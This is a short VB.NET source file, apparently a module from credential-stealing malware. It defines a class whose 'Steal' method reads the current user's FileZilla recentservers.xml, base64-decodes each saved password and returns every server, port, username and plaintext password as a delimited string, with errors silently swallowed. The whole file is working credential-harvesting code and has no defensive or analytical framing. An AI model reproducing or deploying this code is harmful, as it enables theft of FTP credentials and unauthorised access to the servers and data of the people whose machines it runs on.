Imports System.Xml
Imports System.IO
Imports System.Text
Public Class FileZillaData
    Private d As String = "|"
    Private Path As String = Nothing
    Private Function Exists() As Boolean
        Dim RootDir As String = IO.Path.GetPathRoot(Environment.SystemDirectory)
        If Not RootDir.EndsWith("\") Then
            RootDir &= "\"
        End If
        Path = RootDir & "Users\" & Environment.UserName & "\AppData\Roaming\FileZilla\recentservers.xml"
        If IO.File.Exists(Path) Then
            Return True
        End If
    End Function
    Public Function Steal() As String
        Dim Sb As New StringBuilder
        If Exists() Then
            Try
                Dim XmlDocument As XmlDataDocument = New XmlDataDocument()
                Dim XmlNode As XmlNodeList
                XmlDocument.Load(Path)
                XmlNode = XmlDocument.GetElementsByTagName("Server")

                Dim Password() As Byte = Nothing
                For i As Integer = 0 To XmlNode.Count - 1
                    XmlNode(i).ChildNodes.Item(0).InnerText.Trim()
                    Password = Convert.FromBase64String(XmlNode(i).ChildNodes.Item(5).InnerText.Trim())
                    Sb.AppendLine("SERVER: " & XmlNode(i).ChildNodes.Item(0).InnerText.Trim() & d &
                                  "PORT: " & XmlNode(i).ChildNodes.Item(1).InnerText.Trim() & d &
                                  "USER: " & XmlNode(i).ChildNodes.Item(4).InnerText.Trim() & d &
                                  "PASS: " & Encoding.UTF8.GetString(Password))
                Next
            Catch : End Try
        End If
        Return Sb.ToString
    End Function
End Class